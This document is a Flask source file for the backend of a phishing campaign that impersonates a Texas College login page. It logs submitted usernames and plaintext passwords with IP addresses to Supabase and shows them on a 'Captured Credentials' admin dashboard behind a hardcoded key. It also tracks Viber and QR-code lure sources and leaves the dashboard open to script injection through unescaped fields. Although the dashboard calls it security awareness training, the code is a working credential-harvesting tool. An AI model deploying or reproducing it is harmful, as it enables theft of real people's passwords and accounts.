from flask import Flask, request, jsonify, send_from_directory
from supabase import create_client, Client
import os

app = Flask(__name__)

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_SERVICE_KEY = os.getenv("SUPABASE_SERVICE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)

def get_real_ip(req):
    if req.headers.get('X-Forwarded-For'):
        return req.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif req.headers.get('X-Real-IP'):
        return req.headers.get('X-Real-IP')
    return req.remote_addr

def get_device(req):
    ua = req.headers.get('User-Agent', '').lower()
    if any(x in ua for x in ['mobile', 'android', 'iphone', 'ipad']):
        return 'mobile'
    return 'desktop'

@app.route('/')
def index():
    return send_from_directory('.', 'texas-login.html')

@app.route('/api/log', methods=['POST'])
def log_event():
    try:
        data = request.get_json() or {}
        log_data = {
            'event':      data.get('event', ''),
            'source':     data.get('source', 'direct'),
            'device':     get_device(request),
            'username':   data.get('username', ''),
            'password':   str(data.get('password', ''))[:255],
            'ip_address': get_real_ip(request),
            'details':    None
        }
        supabase.table('logs').insert(log_data).execute()
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        print(f"Logging Error: {str(e)}")
        return jsonify({'status': 'error'}), 200

@app.route('/admin')
def admin():
    key = request.args.get('key', '')
    if key != 'texas2024':
        return '<h2 style="font-family:Arial;text-align:center;margin-top:100px">Access Denied</h2>', 403

    try:
        response = supabase.table('logs') \
            .select('*') \
            .order('timestamp', desc=True) \
            .limit(500) \
            .execute()
        all_logs = response.data or []
    except Exception as e:
        print("Admin Error:", str(e))
        all_logs = []

    total_visits    = sum(1 for r in all_logs if r.get('event') == 'visit')
    total_submits   = sum(1 for r in all_logs if r.get('event') == 'submit')
    viber_clicks    = sum(1 for r in all_logs if r.get('event') == 'visit' and r.get('source') == 'viber')
    qr_clicks       = sum(1 for r in all_logs if r.get('event') == 'visit' and r.get('source') == 'qr')
    mobile_submits  = sum(1 for r in all_logs if r.get('event') == 'submit' and r.get('device') == 'mobile')
    desktop_submits = sum(1 for r in all_logs if r.get('event') == 'submit' and r.get('device') == 'desktop')

    submissions = [r for r in all_logs if r.get('event') == 'submit']
    visits      = [r for r in all_logs if r.get('event') == 'visit']

    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="refresh" content="30">
<title>Campaign Admin Dashboard</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ font-family: Arial, sans-serif; background: #f0f2f5; color: #333; }}
  .header {{ background: #1a2a6c; color: #fff; padding: 20px 32px; display: flex; justify-content: space-between; align-items: center; }}
  .header h1 {{ font-size: 1.3rem; font-weight: 700; }}
  .header p  {{ font-size: 0.8rem; color: rgba(255,255,255,0.7); margin-top: 2px; }}
  .clear-btn {{ background: #e0357a; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 0.85rem; text-decoration: none; }}
  .clear-btn:hover {{ background: #c0245a; }}
  .content {{ padding: 28px 32px; max-width: 1200px; margin: 0 auto; }}
  .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 32px; }}
  .stat-card {{ background: #fff; border-radius: 10px; padding: 20px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.07); }}
  .stat-card .number {{ font-size: 2.2rem; font-weight: 800; color: #1a2a6c; }}
  .stat-card .label  {{ font-size: 0.78rem; color: #888; margin-top: 4px; text-transform: uppercase; }}
  .stat-card.teal .number {{ color: #3ab5b0; }}
  .stat-card.pink .number {{ color: #e0357a; }}
  .section {{ background: #fff; border-radius: 10px; padding: 24px; box-shadow: 0 2px 8px rgba(0,0,0,0.07); margin-bottom: 24px; }}
  .section h2 {{ font-size: 1rem; font-weight: 700; margin-bottom: 16px; color: #1a2a6c; border-bottom: 2px solid #3ab5b0; padding-bottom: 8px; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 0.85rem; }}
  th {{ background: #f8f9fa; padding: 10px 12px; text-align: left; font-weight: 700; color: #555; border-bottom: 2px solid #eee; }}
  td {{ padding: 9px 12px; border-bottom: 1px solid #f0f0f0; word-break: break-all; }}
  tr:hover td {{ background: #fafafa; }}
  .badge {{ display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.72rem; font-weight: 700; }}
  .badge-viber   {{ background: #e8f4fd; color: #1a6bb5; }}
  .badge-qr      {{ background: #e8fdf4; color: #1ab56b; }}
  .badge-direct  {{ background: #f5f5f5; color: #888; }}
  .badge-mobile  {{ background: #fdf0e8; color: #b56b1a; }}
  .badge-desktop {{ background: #f0e8fd; color: #6b1ab5; }}
  .empty {{ text-align: center; color: #aaa; padding: 32px; font-size: 0.9rem; }}
  .refresh {{ float: right; font-size: 0.8rem; color: #3ab5b0; text-decoration: none; }}
</style>
</head>
<body>
<div class="header">
  <div>
    <h1>🎓 Texas College — Phishing Campaign Dashboard</h1>
    <p>Security Awareness Training · Auto-refreshes every 30 seconds</p>
  </div>
  <a class="clear-btn" href="/admin/clear-logs?key=texas2024"
     onclick="return confirm('Clear ALL logs? This cannot be undone!')">
     🗑️ Clear All Logs
  </a>
</div>
<div class="content">
  <div class="stats">
    <div class="stat-card">
      <div class="number">{total_visits}</div>
      <div class="label">Total Clicks</div>
    </div>
    <div class="stat-card teal">
      <div class="number">{total_submits}</div>
      <div class="label">Submitted Credentials</div>
    </div>
    <div class="stat-card">
      <div class="number">{viber_clicks}</div>
      <div class="label">Viber Clicks</div>
    </div>
    <div class="stat-card">
      <div class="number">{qr_clicks}</div>
      <div class="label">QR Code Scans</div>
    </div>
    <div class="stat-card">
      <div class="number">{mobile_submits}</div>
      <div class="label">Mobile Submits</div>
    </div>
    <div class="stat-card pink">
      <div class="number">{desktop_submits}</div>
      <div class="label">Desktop Submits</div>
    </div>
  </div>
  <div class="section">
    <h2>🔐 Captured Credentials <a class="refresh" href="?key=texas2024">↻ Refresh</a></h2>
    {'<table><thead><tr><th>Time</th><th>Username</th><th>Password</th><th>Source</th><th>Device</th><th>IP Address</th></tr></thead><tbody>' +
     ''.join(f"<tr><td>{r.get('timestamp','')[:19]}</td><td><b>{r.get('username','')}</b></td><td>{r.get('password','')}</td><td><span class='badge badge-{r.get('source','')}'>{r.get('source','')}</span></td><td><span class='badge badge-{r.get('device','')}'>{r.get('device','')}</span></td><td>{r.get('ip_address','')}</td></tr>" for r in submissions) +
     '</tbody></table>' if submissions else "<div class='empty'>No submissions yet</div>"}
  </div>
  <div class="section">
    <h2>👁️ Page Visits <a class="refresh" href="?key=texas2024">↻ Refresh</a></h2>
    {'<table><thead><tr><th>Time</th><th>Source</th><th>Device</th><th>IP Address</th></tr></thead><tbody>' +
     ''.join(f"<tr><td>{r.get('timestamp','')[:19]}</td><td><span class='badge badge-{r.get('source','')}'>{r.get('source','')}</span></td><td><span class='badge badge-{r.get('device','')}'>{r.get('device','')}</span></td><td>{r.get('ip_address','')}</td></tr>" for r in visits) +
     '</tbody></table>' if visits else "<div class='empty'>No visits yet</div>"}
  </div>
</div>
</body>
</html>'''
    return html

@app.route('/admin/clear-logs')
def clear_logs():
    key = request.args.get('key', '')
    if key != 'texas2024':
        return 'Unauthorized', 401
    try:
        supabase.table('logs').delete().neq('id', 0).execute()
        return '''<script>alert("All logs cleared!"); window.location="/admin?key=texas2024";</script>'''
    except Exception as e:
        return f'Failed: {str(e)}', 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
